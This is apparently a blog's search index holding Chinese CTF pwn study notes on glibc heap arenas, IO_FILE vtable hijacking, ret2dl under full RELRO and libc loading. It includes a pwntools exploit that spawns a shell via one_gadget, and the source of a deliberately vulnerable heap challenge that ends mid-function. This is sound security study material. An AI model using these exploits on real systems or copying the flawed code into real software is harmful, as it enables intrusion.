<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>main_arena与多线程</title>
    <url>/2021/08/20/main_arana%20%E4%B8%8E%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    <content><![CDATA[<html><head></head><body><p>在学习Tcache的时候遇到了一些比较奇怪的点，ctf权威指南pwn篇中对于Tcache的解释中第一段如下：</p>
<blockquote>
<p>Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块，无需对main_arena上锁即可使用。</p>
</blockquote>
<p>首先让我感到不解的就是，“无需对main_arena上锁即可使用”这句话。什么叫对main_arana上锁？之前也遇见过很多文章提到过这个”锁“的相关概念，但是它们从来都不是问题的重点，但是通常来说，正是一个个不懂的”无关紧要“的问题导致最后啥也看不懂的。</p>
<p>所以在这篇文章中我们有必要从ctf pwn的角度去理解线程 main_arena。</p>
<h4 id="加锁">加锁<a class="post-anchor" href="#加锁"></a></h4><p>当<strong>多个线程同时操作同一个共享全局变量</strong>的时候，对线程上锁，保证同一时间一个对象只有一个线程在访问，可以解决资源占用问题，同时保证了数据的安全性。</p>
<h4 id="线程">线程<a class="post-anchor" href="#线程"></a></h4><p>线程一般来说被进程包含：一个进程可以有很多线程来处理，每条线程并行执行不同的任务。</p>
<p>比如说ptmalloc2这个是个进程，然后其中包含很多很多线程。</p>
<p>其中会有一个<code>main_arena</code>,是整个ptmalloc2进程中的主线程，然后main_arena会有很多子线程，每个子线程包含很多连续的内存片段，被称为heap。每一个heap都有自己的heap_header，它们通过链表互相连接，且其中保存了指向其所属arena的指针。</p>
<p>这么讲似乎有一些太过抽象。具体一点讲就是，在只有一个main_arena的时候，ptmalloc只能通过mmap和sbrk申请堆内存。</p>
<blockquote>
<p>在多线程的情况下，显然让所有的线程公用一个数据结构来获取内存块会造成十分惨烈的对锁的竞争，所以 ptmalloc 中间多了一层组织结构——arena。每个arena包含一些可用的内存区块，用一个 arena 级别的锁来控制访问。当线程比较少的时候，每个可以拥有自己的arena，而当 arena 数目超过允许最大值时，多个线程共享一个 arena 了。个线程第一次 malloc 的时候都会 attach 一个 arena 。除非这个 arena 被标记为破坏的（ARENA_CORRUPTION_BIT），否则该线程以后再 malloc 都会继续用这个 arena。</p>
</blockquote>
<p>之前ctf权威指南中有讲到，每一个子线程包含很多连续的内存片段，被称为heap。它们都有自己所属的arena。这句话很容易让人觉得——每一个子线程有且只有一个arena，但是还存在多对一的情况。</p>
<p>但是对于ctf pwn来说，实际情况远远没有这么复杂，基本我们操作的所谓的堆，chunk这些概念，考点基本都是建立在单线程的情况下的，它们的arena也都是<code>main_arena</code>而并不是什么<code>non_main_arena</code>。并且只有<code>main_arena</code>    能够访问<code>heap</code>段，<code>non_main_arena</code>只能访问<code>mmap</code>映射区域。</p>
<h3 id="总结">总结<a class="post-anchor" href="#总结"></a></h3><p>用比较简单的话来说，main_arena就是主线程中一个管理所有链表的关键的数据结构，我们可以通过它获得各个bins的偏移。以及利用指向它的fd来做一些不好的事情（）。承接之前的内容，我们在利用main_arena的同时也需要对其进行上锁，防止别的线程与它共用一个资源，然后之前Tcahce里的“无需对main_arena上锁”意思也很清楚了，因为考虑到效率。所以抛弃了一定的安全性。</p>
<h2 id="参考">参考<a class="post-anchor" href="#参考"></a></h2><p><a href="https://zhuanlan.zhihu.com/p/24909781">malloc x 线程</a></p>
<p><a href="https://www.wangan.com/docs/1741">GLibcHeap</a></p>
</body></html>]]></content>
      <tags>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>roputils使用tips</title>
    <url>/2021/08/03/roputils/</url>
    <content><![CDATA[<html><head></head><body><p>做ret2dl的时候难免会偷懒使用工具。</p>
<p>但是这个工具并没有看起来那么和善。</p>
<p>就怎么使用utils包我都研究了一会儿，然后发现只需要<code>import roputils</code>然后把相对应的那个py脚本放到同一路径下就好。</p>
<p>但是紧接着第二问个问题，这个py脚本通篇是python2，而我日常无论哪个系统都是py3。</p>
<p>所以解决方式有2</p>
<ol>
<li> 将roputils转换为py3</li>
<li>ubuntu切换py版本</li>
</ol>
<p>反正第一种就是用一个叫2to3的脚本。是py2自带的，使用需要先安装py2.7，我ubuntu18.04自带py2.7，所以就直接<code>2to3 -w roputils.py</code></p>
<p>具体参数可以google。</p>
<p>然后又来了第三个问题。</p>
<p>来看我的报错。</p>
<pre><code class="python">[+] Starting local process './babystack': pid 745
Traceback (most recent call last):
  File "babystack.py", line 23, in &lt;module&gt;
    rop = roputils.ROP('./babystack')
  File "/home/fur1n/pwn/week1/roputils.py", line 440, in __init__
    ELF.__init__(self, *args, **kwargs)
  File "/home/fur1n/pwn/week1/roputils.py", line 85, in __init__
    m = re.search(r'^\s*(?P&lt;key&gt;[^:]+):\s+(?P&lt;value&gt;.+)$', line)
  File "/usr/lib/python3.6/re.py", line 182, in search
    return _compile(pattern, flags).search(string)
TypeError: cannot use a string pattern on a bytes-like object
</code></pre>
<p>这个功能好像并不会在byte前加b。。。</p>
<p>目前来说并没有发现解决方法。</p>
<p>所以只能尝试更换默认的py版本。具体可以google</p>
</body></html>]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>IO_FILE学习</title>
    <url>/2021/08/09/io_file/</url>
    <content><![CDATA[<html><head></head><body><p>io_file学习笔记</p>
<h3 id="0）review">0）review<a class="post-anchor" href="#0）review"></a></h3><p>glibc定义了<code>_IO_FILE</code>这样一个结构体来管理io file。io_file结构体里定义了一堆相关的变量，但是真正关键的是其中包含的<code>_IO_FILE_plus</code>结构</p>
<p>结构源码如下</p>
<pre><code class="c">struct _IO_FILE_plus
{
    _IO_FILE    file;
    IO_jump_t   *vtable;
}
</code></pre>
<p>这个结构包含了一个叫<code>vtable</code>的指针，指向实现io函数各种功能的真正函数。</p>
<p>以fread为例子简述io_file结构调用的流程</p>
<h4 id="fread">fread<a class="post-anchor" href="#fread"></a></h4><p>fread真正功能的实现在子函数<code>_IO_sgetn</code>中。</p>
<p>下面是<code>_IO_sgetn</code>的源码。</p>
<pre><code class="c">_IO_size_t
_IO_sgetn (fp, data, n)
     _IO_FILE *fp;
     void *data;
     _IO_size_t n;
{
  return _IO_XSGETN (fp, data, n);
}
</code></pre>
<p>实际上也是先定义一堆变量然后内部再调用另外一个函数。</p>
<p>也就是<code>_IO_XSGETN</code>。</p>
<p>这个函数并不简单，它是<code>_IO_FILE_plus.vtable</code> 中的函数指针，在调用这个函数时会首先取出 vtable 中的指针然后再进行调用。</p>
<p>vtable也是一个指针，指向结构体<code>_IO_jump_t</code></p>
<p><code>_IO_jump_t</code>源码如下</p>
<pre><code class="c">struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
</code></pre>
<p>这里vtable就像一个中转站，通过它调用<code>_IO_jump_t</code>中的各种函数。</p>
<p>比如说这里fread就是调用的<code>_IO_file_xsgetn</code>函数。</p>
<p>值得注意的是调用这个函数之前需要把它从vtable中取出从，然后才跳过去调用。</p>
<pre><code class="c">  if (fp-&gt;_IO_buf_base
          &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))
        {
          if (__underflow (fp) == EOF)
        break;

          continue;
        }
</code></pre>
<p>函数源码如上，实现的是一个键盘输入。 </p>
<p>实际上orw三个功能的原理都差不多，都是经过vtable指针调用函数。只是最后的功能有区别而已。</p>
<h3 id="伪造vtable">伪造vtable<a class="post-anchor" href="#伪造vtable"></a></h3><p>在刚在的fread调用分析中我们认识到vtable实际上就是一个中转站，如果我们能够控制这个中转站的内容，我们也就相应地能够控制程序进行一些奇怪的操作了。</p>
<p>那么应该如何伪造vtable呢？<br>目前有两种思路。</p>
<p>一种是直接修改vtable中的指针，进行一个任意地址读写，第二种是覆盖 vtable 的指针，使其指向一段可控的内存空间，也就相当于伪造vtable。</p>
<p>在libc2.23以后的版本vtable不能被直接写入数据，所以只能用第二种方法–伪造vtable。</p>
<p>但是我们先从第一个方法来试一试。</p>
<p>示例来源于ctf-wiki</p>
<pre><code class="c">int main(void)
{
    FILE *fp;
    long long *vtable_ptr;
    fp=fopen("123.txt","rw");
    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable

    vtable_ptr[7]=0x41414141 //xsputn

    printf("call 0x41414141");
}
</code></pre>
<p>这边利用的具体步骤比较直观。</p>
<p>遍历 <code>_IO_list_all</code> ，然后调用 <code>_IO_2_1_stdout_</code> 下的 <code>vtable</code> 中 <code>_setbuf</code> 函数。</p>
<p>承接上文的思路，我们需要在某个可控内存伪造vtable，然后修改_setbuf函数为关键内容。</p>
<p>在这道题中，我们可以在vtable附近修改两个字节构造fake vtable，然后利用三个字节改_setbuf为one_gadget。</p>
<p>开头直接给出了sleep函数的真实地址，程序内存地址完全暴露，我们可以通过它找到exit调用的stdout的地址。</p>
<pre><code class="bash">pwndbg&gt; print _IO_2_1_stdin_
$2 = {
  file = {
    _flags = -72540024, 
    _IO_read_ptr = 0x0, 
    _IO_read_end = 0x0, 
    _IO_read_base = 0x0, 
    _IO_write_base = 0x0, 
    _IO_write_ptr = 0x0, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x0, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0, 
    _flags2 = 0, 
    _old_offset = -1, 
    _cur_column = 0, 
    _vtable_offset = 0 '\000', 
    _shortbuf = "", 
    _lock = 0x7ffff7dcf8d0 &lt;_IO_stdfile_0_lock&gt;, 
    _offset = -1, 
    _codecvt = 0x0, 
    _wide_data = 0x7ffff7dcdae0 &lt;_IO_wide_data_0&gt;, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0, 
    _mode = 0, 
    _unused2 = '\000' &lt;repeats 19 times&gt;
  }, 
  vtable = 0x7ffff7dca2a0 &lt;_IO_file_jumps&gt;
}
</code></pre>
<p>我们可以看到vtable的地址是0x7ffff7dca2a0。</p>
<p>然后我们需要在它附近伪造一个vtable。</p>
<ol>
<li>伪造的vtable需要符合以下条件：<br>1:<code>fake_vtable + 0x58</code>=<code>libc_base+off_3</code></li>
</ol>
<p>完整exp</p>
<pre><code class="python">from pwn import *
context.log_level="debug"

libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
p = process('the_end')

libc_base = long(sleep_ad,16) - libc.symbols['sleep']
one_gadget = libc_base + 0xf02b0
vtables =     libc_base + 0x3C56F8

fake_vtable = libc_base + 0x3c5588
target_addr = libc_base + 0x3c55e0

for i in range(2):
    p.send(p64(vtables+i))
    p.send(p64(fake_vtable)[i])


for i in range(3):
    p.send(p64(target_addr+i))
    p.send(p64(one_gadget)[i])

p.sendline("exec /bin/sh 1&gt;&amp;0")

p.interactive()
</code></pre>
<h4 id="总结">总结<a class="post-anchor" href="#总结"></a></h4><p>伪造vtable算是io_file中比较简单好懂的一点了，只要对数据结构稍微熟悉一点就能很快理解。然后伪造的方式和思路也比较直接，可以说是经典pwn思路了////</p>
<p>下一章我们将学习FSOP，感觉难度会比伪造vtable高出不少，其实只要沉下心来看都不难，最难的目前来说还是那些高版本的防护的绕过了。</p>
<h3 id="FSOP">FSOP<a class="post-anchor" href="#FSOP"></a></h3><p>上一part我们学习了如何通过伪造vtable加上打one_gsdget来getshell，理解起来比较简单，实际操作也并不复杂，只要能找到fake vtable的位置并且正确理解one gadget的用法就好。</p>
<p>这一个part我们学习FSOP。</p>
<p>ps：不管是fsop还是后面的glibc2.24下的伪造vtable在ctf中的考察都较少。但是不能说不重要吧///</p>
<p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项</p>
</body></html>]]></content>
      <tags>
        <tag>io_file</tag>
      </tags>
  </entry>
  <entry>
    <title>patch&#39;alarm</title>
    <url>/2021/08/03/patch%20alarm/</url>
    <content><![CDATA[<html><head></head><body><p>比较弱智的一个操作，但是如果没注意到的话还是有一点点坑。</p>
<p>一般来说许多题都喜欢在main函数里加alarm。</p>
<p>alarm会导致调试的时候超时，如果没有解决的话基本不能调试。算最基础的的反调试手法了。</p>
<p>ps:关于超时的那个报错当时还好好研究了一会儿来着。就是一个sigxxx，sigalarm好像，然后默认返回中止程序。</p>
<p>解决方案也比较弱智。就是直接patch掉就好了。</p>
<p>ida都关了懒得上图了。</p>
</body></html>]]></content>
      <tags>
        <tag>mess</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu加载不同版本libc</title>
    <url>/2021/08/17/ubuntu%E5%8A%A0%E8%BD%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AClibc/</url>
    <content><![CDATA[<html><head></head><body><h2 id=""><a class="post-anchor" href="#"></a></h2><h4 id="1）review">1）review<a class="post-anchor" href="#1）review"></a></h4><p> 这个问题困扰了我多年，之前年轻的时候不知道为什么有的是题我就是死活调不出，后来才知道呀原来用的ubunt的版本太高了。但是我一直忽视了这个问题以为并不是什么关键的因素。我是这么认为的–只要清楚了利用方法并记住对应的libc版本，无论是不是真的把这道题调试出来了都无所谓。</p>
<p>然后我就是这样一步一步地变得不会调试的。</p>
<p>但是完整地把一道题调出来。这才是关键。这才是pwn题的灵魂。</p>
<p>呜呜呜，我居然一直忽略了它的灵魂</p>
<p>所以这一次我一定要解决掉这个问题。</p>
<p>之前做考核的时候，稍微研究过这个问题。但是因为下载的的libc并没有debug符号，最终还是放弃了。</p>
<p>目前来说针对题目的调试，一般来说是本地，远程也不用考虑这个问题。</p>
<h4 id="2）原理">2）原理<a class="post-anchor" href="#2）原理"></a></h4><p>在这之前我们需要了解一下ld以及libc在动态链接中的具体作用。实际上这也是一个比较基础的概念，ld链接器，libc共享库没什么好说的。</p>
<p>但是这里有一堆环境变量就很离谱。我们来依次列举一下并且搞清楚它们是做什么的。</p>
<h5 id="1）LD-PRELOAD">1）LD_PRELOAD<a class="post-anchor" href="#1）LD-PRELOAD"></a></h5><p>首先就是我们在脚本前加载的<code>LD_PRELOAD</code>这个东西。一般的用法是<code>env={"LD_PRELOAD":libc_path}</code></p>
<p>它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。</p>
<p>这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p>
<p>换句话说我们可以通过指定这个环境变量来指定特定的libc版本。</p>
<h5 id="2）LD-LIBRARY-PATH和LIBRARY-PATH">2）LD_LIBRARY_PATH和LIBRARY_PATH<a class="post-anchor" href="#2）LD-LIBRARY-PATH和LIBRARY-PATH"></a></h5><p>LD_LIBRARY_PATH用于在<em><strong>程序加载运行期间</strong></em>查找动态链接库时指定除了系统默认路径之外的其他路径.</p>
<p>LIBRARY_PATH环境变量用于在<em><strong>程序编译期间</strong></em>查找动态链接库时指定查找共享库的路径</p>
<p>其实可以发现这三个环境变量都是修改程序需要的共享库，但是生效的时间不一样。</p>
<p>并且在pwn题中基本都是需要在运行前指定另外的共享库的，所以<code>LD_PRELOAD</code>还是比较常见。</p>
<p>相关（？）环境变量大概就这么多，然后是某些特殊的段。</p>
<h5 id="1）-PT-INTERP">1） PT_INTERP<a class="post-anchor" href="#1）-PT-INTERP"></a></h5><p>储存了程序使用的ld.so的路径，默认使用 /lib64/ld-linux-x86-64.so.2。</p>
<p>我们可以修改这个段的内容来指定我们需要的链接器。</p>
<h4 id="汇总">汇总<a class="post-anchor" href="#汇总"></a></h4><p>综上，我们首先要准备我们需要的libc和ld，libc可以是编译好的elf文件也可以通过源码自己编译，这个无所谓。ld文件比较诡异，似乎是一个ld能同时支持很多libc的小版本。并不是一对一的关系。</p>
<p>准备好了以后我们通过脚本将题目<code>PT_INTERP</code>段修改，然后通过<code>LD_PRELOAD</code>指定我们需要的libc的路径即可。</p>
<h4 id="实际操作">实际操作<a class="post-anchor" href="#实际操作"></a></h4><p>我们以lonelywolf为例。</p>
<p>有一个很尴尬的事实就是，我找不到比赛提供的libc了。当时存了，但是没有了。</p>
<h3 id="参考">参考<a class="post-anchor" href="#参考"></a></h3><p><a href="https://www.cnblogs.com/net66/p/5609026.html"></a><a href="https://www.cnblogs.com/net66/p/5609026.html">LD_PRELOAD的偷梁换柱之能</a></p>
</body></html>]]></content>
      <tags>
        <tag>linux primary</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2dl_advanced</title>
    <url>/2021/08/02/ret2dl_advanced/</url>
    <content><![CDATA[<html><head></head><body><h1 id=""><a class="post-anchor" href="#"></a></h1><h2 id="ret2dl-advanced">ret2dl_advanced<a class="post-anchor" href="#ret2dl-advanced"></a></h2><h3 id="1-review">1)review<a class="post-anchor" href="#1-review"></a></h3><p>当FULL RELRO保护开启时，通过 <code>dl_run_time</code>来获取libc基址的方式几乎无解。</p>
<p>但是我们仍然能够找到某种方式来getshell。</p>
<p>相关论文中给出一种解决方案，即通过<code>dt_bug</code>入口找到突破点。</p>
<p>(Ps:为什么找不到相关的中文文章)</p>
<h3 id="2）dt-dbg？">2）dt_dbg？<a class="post-anchor" href="#2）dt-dbg？"></a></h3><p><code>dt_dbg</code>这个概念实际上并不新鲜，简单来说它可以被包含在<code>libc.so</code>文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个<code>libc.so</code>文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。</p>
<p><code>dt_dubug</code>用于指向<code>type_r_debug</code>这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。</p>
<p>此外，这个结构体的<code>r_map</code>域保存了指向<code>link_map</code>的链接表表头的指针。</p>
<p>也就是<code>dt_dbg</code>指向<code>type_r_debug</code>，且<code>type_r_debug</code>维护了指向<code>link_map</code>的指针。</p>
<p><code>r_debug</code>具体代码如下:</p>
<pre><code class="c">/* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable's dynamic section has a DT_DEBUG element, the run-time linker sets that element's value to the address where this structure can be found. */

struct r_debug
  { 
    int r_version;              /* Version number for this protocol. */

    struct link_map *r_map;     /* Head of the chain of loaded objects. */

    /* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */
    ElfW(Addr) r_brk;
    enum
      { 
        /* This state value describes the mapping change taking place when the `r_brk' address is called. */
        RT_CONSISTENT,          /* Mapping change is complete. */
        RT_ADD,                 /* Beginning to add a new object. */
        RT_DELETE               /* Beginning to remove an object mapping. */
      } r_state;

    ElfW(Addr) r_ldbase;        /* Base address the linker is loaded at. */
  };
</code></pre>
<p>实操一遍</p>
<p>随便写一个无output的栈溢出。</p>
<pre><code class="bash">fur1n@ubuntu:~/pwn$ readelf -d ret2dl

Dynamic section at offset 0xdb8 contains 27 entries:
  Tag        Type                         Name/Value
...
 0x0000000000000015 (DEBUG)              0x0

</code></pre>
<p>在没有运行的时候<code>dt_dbg</code>为空。</p>
<p>在关闭aslr的情况下找到<code>dt_debug</code>并不困难。</p>
<p>gdb使用<code>elfheader</code>命令查看相关elfheader的地址，可以找到<code>.dynamic</code></p>
<p>段的地址。</p>
<pre><code class="bash">pwndbg&gt; x/50gx 0x600e20
...
0x600ee0:    0x0000000000000015    0x00007ffff7ffe140
</code></pre>
<p>0x00007ffff7ffe140也就是<code>dt_debug</code>指向的<code>r_debug</code>的地址。</p>
<pre><code class="bash">pwndbg&gt; x/20gx 0x00007ffff7ffe140
0x7ffff7ffe140 &lt;_r_debug&gt;:    0x0000000000000001    0x00007ffff7ffe170
0x7ffff7ffe150 &lt;_r_debug+16&gt;:    0x00007ffff7de3f40    0x0000000000000000
0x7ffff7ffe160 &lt;_r_debug+32&gt;:    0x00007ffff7dd3000    0x0000000000000000
0x7ffff7ffe170:    0x0000000000000000    0x00007ffff7ffe700
0x7ffff7ffe180:    0x0000000000600e20    0x00007ffff7ffe710
0x7ffff7ffe190:    0x0000000000000000    0x00007ffff7ffe170
0x7ffff7ffe1a0:    0x0000000000000000    0x00007ffff7ffe6e8
0x7ffff7ffe1b0:    0x0000000000000000    0x0000000000600e20
0x7ffff7ffe1c0:    0x0000000000600f00    0x0000000000600ef0
0x7ffff7ffe1d0:    0x0000000000000000    0x0000000000600ea0
</code></pre>
<p><code>r_debug</code>维护的第一个结构体，也就是<code>link_map</code>地址，即<code>0x00007ffff7ffe170</code></p>
<pre><code class="bash">0x7ffff7ffe140 &lt;_r_debug&gt;:    0x0000000000000001    0x00007ffff7ffe170
</code></pre>
<p>这样我们就从<code>dt_debug</code>找到了<code>link_map</code>的地址。</p>
<p>虽然但是。</p>
<p>只是找到<code>link_map</code>没啥用。</p>
<p>我们的最终目的还是寻找到<code>dl_runtime_resolve</code>函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。</p>
<p>能从动态链接库中找到<code>dl_runtime_resolve</code>函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到<code>dl_runtime_resolve</code>函数地址，那么问题就迎刃而解了。</p>
<p>那么如何寻找呢？</p>
<p>实际比较简单（无aslr的情况），只要根据<code>link_map</code>的结构依次顺下来就好了。</p>
<p>上一个section我们找到了<code>link_map</code>的地址，接下来我们通过<code>link_map</code>逐步找到</p>
<p><code>dl_runtime_resolve</code>。</p>
<p>首先我们找到<code>libc.so.6</code>文件。</p>
<pre><code class="bash">pwndbg&gt; x/20gx 0x00007ffff7ffe170
0x7ffff7ffe170:    0x0000000000000000    0x00007ffff7ffe700
0x7ffff7ffe180:    0x0000000000600e20    0x00007ffff7ffe710
---
pwndbg&gt; x/20gx 0x00007ffff7ffe700
0x7ffff7ffe700:    0x0000000000000000    0x0000000000000000
0x7ffff7ffe710:    0x00007ffff7ffb000    0x00007ffff7ffebb0
---
pwndbg&gt; x/s 0x00007ffff7ffebb0
0x7ffff7ffebb0:    "linux-vdso.so.1"
---
pwndbg&gt; x/10gx 0x00007ffff7ffe710
0x7ffff7ffe710:    0x00007ffff7ffb000    0x00007ffff7ffebb0
0x7ffff7ffe720:    0x00007ffff7ffb3a0    0x00007ffff7fe2000
---
pwndbg&gt; x/10gx 0x00007ffff7fe2000
0x7ffff7fe2000:    0x00007ffff79e2000    0x00007ffff7ffedd0
---
pwndbg&gt; x/s 0x00007ffff7ffedd0
0x7ffff7ffedd0:    "/lib/x86_64-linux-gnu/libc.so.6"
</code></pre>
<p>即<code>0x00007ffff7ffedd0</code>。</p>
<p>0x3即<code>GOT[]</code>入口</p>
<pre><code class="bash">pwndbg&gt; x/30gx 0x00007ffff7dccb80
...
0x7ffff7dccc30:    0x0000000000000003    0x00007ffff7dcd000
</code></pre>
<p>找到GOT[3]</p>
<pre><code class="bash">pwndbg&gt; x/5gx 0x00007ffff7dcd000
0x7ffff7dcd000:    0x00000000003eab80    0x00007ffff7fe2000
0x7ffff7dcd010:    0x00007ffff7dea8f0    0x00007ffff7b70a10
</code></pre>
<pre><code class="bash">pwndbg&gt; xinfo 0x00007ffff7dea8f0
Extended information for virtual address 0x7ffff7dea8f0:

  Containing mapping:
    0x7ffff7dd3000     0x7ffff7dfc000 r-xp    29000 0      /lib/x86_64-linux-gnu/ld-2.27.so

  Offset information:
         Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0
         File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0
      File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0
         File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0

 Containing ELF sections:
               .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0
</code></pre>
<h3 id="3）exploitation">3）exploitation<a class="post-anchor" href="#3）exploitation"></a></h3><p>在无aslr并已经获取到<code>dl_runtime_resolve</code>的情况下的利用和patial relro相似。</p>
<p>有aslr的情况。。</p>
<p>我也不会。</p>
<h3 id="4-refrence">4)refrence<a class="post-anchor" href="#4-refrence"></a></h3><p><a href="http://rk700.github.io/2015/04/09/dt_debug-read/">通过DT_DEBUG来获得各个库的基址</a></p>
<p><a href="https://www.usenix.org/conference/usenixsecurity15/technical-sessions/presentation/di-frederico">How the ELF Ruined Christmas</a></p>
<p><a href="https://ypl.coffee/dl-resolve-full-relro/">Finding link_map and _dl_runtime_resolve() under full RELRO</a></p>
<p>————————————————tbc——————————————————-</p>
</body></html>]]></content>
      <tags>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>SummerTask</title>
    <url>/2021/08/02/summertask/</url>
    <content><![CDATA[<html><head></head><body><h1 id="1）Summer-Havard">1）Summer_Havard<a class="post-anchor" href="#1）Summer-Havard"></a></h1><h2 id="1-考点">1) 考点<a class="post-anchor" href="#1-考点"></a></h2><p>unlink</p>
<p>chunk overlapping</p>
<p>off by one/null</p>
<h2 id="2）源码">2）源码<a class="post-anchor" href="#2）源码"></a></h2><pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include&lt;sys/stat.h&gt;

#define MAX_IDX 100//the maximum number of songs which can be created
#define MAX_SIZE 9999//the maximum size of your chunk
//#define MAGICAL_IDX rand()%1000 // MAGICAL_IDX is a randow number in range of 0 - 1000.
//#define MAGICAL_IDX 2 // MAGICAL_IDX is a randow number in range of 0 - 1000.

//int MAGIC_NAME =  831;//the name of the target song to getshell

struct song // create the struct of song
{
  char *name; //the name of the song
  size_t size;//the size of the song
};

struct song *songlist[MAX_IDX];//set the max number of the songs

void menu()
{
  puts("|----------------------------|");
  puts("|         MY_PLAYER          |");
  puts("|----------------------------|");
  puts("|1.DOWNLOAD THE SONG         |");
  puts("|2.DELETE THE SONG           |");
  puts("|3.LISTENING                 |");
  puts("|4.EDIT THE NAME OF THE SONG |");
  puts("|5.EXIT                      |");
  puts("|6.PWNED                     |");
  puts("|----------------------------|");
  puts("|            ∧ ___ ∧         |");
  puts("|           / ●   ● |        |");
  puts("|          /    -   |        |");
  puts("|----------------------------|");
}

void download() //add a new heap includeing a size chunk and content chunk.
{ int i;
  char buf[8];//the buffer of the read func .
  size_t size;//the size of the chunk.
  if (MAX_IDX &gt; 100) //set the range .
  {
    puts(" MEMORY EXCESSIVE LOAD ");
    return;
  }
  for (i = 0; i &lt; MAX_IDX; i++)//init the struct heap.
  {
    if (!songlist[i]) 
    {
      songlist[i] = (struct song *)malloc(sizeof(struct song));
      if (!songlist[i])
       {
        puts("ALLOCA ERROR");
        exit(-1);
       } //error
  
      printf("SIZE OF THE SONG :");
      scanf("%ld",&amp;size);
      if (size &gt; 0 &amp;&amp; size &lt; MAX_SIZE)
      {
        songlist[i]-&gt;name = (char *)malloc(size);//add a chunk to store the struct 'size' .
      if (!songlist[i]-&gt;name) 
      {
        puts("ALLOCA ERROR");
        exit(-1);
      }//error
      printf("NAME :");
      read(0,songlist[i]-&gt;name,size);
      //scanf("%c",&amp;(songlist[i]-&gt;name));
      puts("DOWNLOAD SUCCESFULLY");
      break;
      }
      else
      {
        printf("(INVALID SIZE)\n" );
        break;
      }
      
    }
  }
}

void delete()//delete
{ 
  int idx;
  char buf[4];
  printf("INDEX :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx &lt; 0 || idx &gt;= 100) 
  {
    puts("INVALID INDEX!!!");
    exit(0);
  }
  if (songlist[idx]) 
  {
    free(songlist[idx]-&gt;name);
    free(songlist[idx]);
    puts("DELETE SUCCESFULLY");
  }
  else
    {
      puts("THE SONG DOESN'T EXIST!");
    }
}

void listen()
{ 
  char buf[4];
  int idx;
  printf("INDEX :");
  read(0, buf, 4);
  idx = atoi(buf);
  if (idx &lt; 0 || idx &gt; 100) 
  {
    puts("INVALID INDEX!!!");
    exit(0);
  }
  if (songlist[idx])
  {
  printf("YOU ARE LINTENING TO %s ",songlist[idx]-&gt;name);
  }  
  else
    {
      puts("THE SONG DOESN'T EXIST!");
    }
}

void edit()
{ 
  char buf[8];
  int idx;
  size_t size;

  puts("NOW YOU CAN CHANGE YOUR SONG'S NAME!!");

  printf("INDEX OF YOUR TERGGER SONG: ");
  scanf("%d",&amp;idx);
  if(idx &lt; 0 || idx &gt; 100)
    {
      puts("INVALID INDEX!!!");
      exit(0);
    }
    printf("SIZE OF THE SONG :");
    read(0, buf, 8);
    size = atoi(buf);
    songlist[idx]-&gt;name = (char *)malloc(size);//add a chunk to store the struct 'size' .
